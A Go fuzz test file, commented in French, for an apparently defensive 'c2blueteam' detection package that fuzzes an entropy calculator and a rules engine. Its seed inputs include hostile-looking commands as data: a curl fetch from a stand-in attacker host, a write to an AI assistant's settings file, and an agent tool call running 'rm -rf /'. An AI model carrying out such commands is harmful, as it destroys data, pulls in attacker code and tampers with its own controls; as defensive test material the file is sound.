// SPDX-License-Identifier: Apache-2.0 OR MIT

package c2blueteam

import (
	"testing"
)

// FuzzCalcEntropy teste la robustesse du calculateur d'entropie contre tout flux d'octets arbitraire
func FuzzCalcEntropy(f *testing.F) {
	// Corpus initial
	f.Add([]byte("Hello, World!"), uint64(13))
	f.Add([]byte("AAAAAA"), uint64(6))
	f.Add([]byte{0, 1, 2, 3, 4, 5, 6, 7, 8, 9}, uint64(10))
	f.Add(make([]byte, 256), uint64(256))

	f.Fuzz(func(t *testing.T, data []byte, declaredLen uint64) {
		// Doit s'exécuter sans jamais paniquer, même en cas de désaccord de longueur
		ent := C2bt_calc_entropy_8_8(data, declaredLen)
		if ent > 2048 {
			t.Errorf("entropie calculée > 2048 (8.0 b/o) : %d", ent)
		}
	})
}

// FuzzRulesEngine teste la robustesse du moteur de règles sans branchement
func FuzzRulesEngine(f *testing.F) {
	f.Add(uint16(C2BT_SUB_PROC), uint16(C2BT_ACT_EXEC), []byte("curl -fsSL https://attacker.com"))
	f.Add(uint16(C2BT_SUB_FS), uint16(C2BT_ACT_WRITE), []byte("/home/u/.claude/settings.json"))
	f.Add(uint16(C2BT_SUB_MCP), uint16(C2BT_ACT_TOOL_CALL), []byte("run_command rm -rf /"))

	f.Fuzz(func(t *testing.T, sub uint16, act uint16, payload []byte) {
		inBatch := make([]Probe_event_t, 1)
		outBatch := make([]Probe_event_t, 1)

		inBatch[0].Subsystem = sub
		inBatch[0].Action = act
		if len(payload) > 0 {
			n := copy(inBatch[0].Payload[:], payload)
			if n < len(inBatch[0].Payload) {
				inBatch[0].Payload[n] = 0
			}
		}

		evalCount := C2bt_eval_rules_batch(inBatch, outBatch, 1)
		if evalCount != 1 {
			t.Errorf("evalCount = %d, attendu 1", evalCount)
		}
	})
}
